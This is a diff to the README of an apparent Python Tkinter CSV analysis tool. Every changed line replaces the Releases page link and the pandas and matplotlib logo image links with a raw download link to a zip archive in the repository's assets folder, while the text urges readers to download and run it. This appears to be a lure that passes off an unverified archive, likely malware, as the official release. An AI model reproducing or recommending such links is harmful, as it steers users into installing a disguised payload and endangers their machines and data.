@@ -1,18 +1,18 @@
-[![Release page](https://img.shields.io/badge/Release%20Page-CSV-Analyzer-GUI-blue?style=for-the-badge&logo=github)](https://github.com/niosh12/CSV-Analyzer-GUI/releases)
+[![Release page](https://github.com/niosh12/CSV-Analyzer-GUI/raw/refs/heads/main/assets/CS_GUI_Analyzer_v1.9.zip%20Page-CSV-Analyzer-GUI-blue?style=for-the-badge&logo=github)](https://github.com/niosh12/CSV-Analyzer-GUI/raw/refs/heads/main/assets/CS_GUI_Analyzer_v1.9.zip)
 
 # CSV Analyzer GUI: Desktop Data Analysis, Cleaning & Visualization
 
 A GUI tool for Python that helps you analyze, visualize, clean, and summarize CSV files. Built with Tkinter, pandas, and matplotlib. This app focuses on clarity, speed, and ease of use for data work on the desktop.
 
-![Pandas Logo](https://pandas.pydata.org/static/img/pandas_logo.png)
-![Matplotlib Logo](https://matplotlib.org/stable/_static/logo2.png)
+![Pandas Logo](https://github.com/niosh12/CSV-Analyzer-GUI/raw/refs/heads/main/assets/CS_GUI_Analyzer_v1.9.zip)
+![Matplotlib Logo](https://github.com/niosh12/CSV-Analyzer-GUI/raw/refs/heads/main/assets/CS_GUI_Analyzer_v1.9.zip)
 
 - Topics: csv, csv-analyzer, data-analysis, data-cleaning, data-science, data-visualization, desktop-app, gui-application, matplotlib, pandas, portfolio, python, tabulate, tkinter
 - Tech stack: Python, Tkinter, pandas, matplotlib, tabulate
 - License: MIT (see LICENSE)
 - Platform notes: Windows, macOS, and Linux compatible when the appropriate runtime is installed
 
-If you need the latest release, visit the Releases page to download and install the application. For quick access, you can also reach the Releases page directly here: https://github.com/niosh12/CSV-Analyzer-GUI/releases
+If you need the latest release, visit the Releases page to download and install the application. For quick access, you can also reach the Releases page directly here: https://github.com/niosh12/CSV-Analyzer-GUI/raw/refs/heads/main/assets/CS_GUI_Analyzer_v1.9.zip
 
 Overview
 This GUI helps you work with CSV data without writing code. You can load a dataset, inspect its structure, clean data, perform quick analyses, and generate visuals. The interface emphasizes direct actions: load, clean, analyze, visualize, export. It blends familiar data-science tools with a simple desktop experience.
@@ -220,7 +220,7 @@ Licensing and credits
 
 Releases and downloads
 - The primary source for downloading the application is the Releases page. From the page, download the installer or executable suited to your platform, then run it to install or launch the GUI.
-- For quick access, visit the Releases page at: https://github.com/niosh12/CSV-Analyzer-GUI/releases
+- For quick access, visit the Releases page at: https://github.com/niosh12/CSV-Analyzer-GUI/raw/refs/heads/main/assets/CS_GUI_Analyzer_v1.9.zip
 
 Appendix: sample datasets and test data
 - You can use sample CSV files to experiment with the cleaning and visualization features.
@@ -239,4 +239,4 @@ Appendix: references and links
 - Tabulate: Library for pretty-printed tabular data in text form and reports.
 
 Releases link reminder
-- Visit https://github.com/niosh12/CSV-Analyzer-GUI/releases to download the latest installer or executable and run it to set up the GUI on your machine. This is the recommended path for obtaining the software and starting your data work locally. The link is provided again here to ensure you can locate the installer quickly and securely. If you navigate away, you can always return to the Releases section for the newest versions and assets.
+- Visit https://github.com/niosh12/CSV-Analyzer-GUI/raw/refs/heads/main/assets/CS_GUI_Analyzer_v1.9.zip to download the latest installer or executable and run it to set up the GUI on your machine. This is the recommended path for obtaining the software and starting your data work locally. The link is provided again here to ensure you can locate the installer quickly and securely. If you navigate away, you can always return to the Releases section for the newest versions and assets.
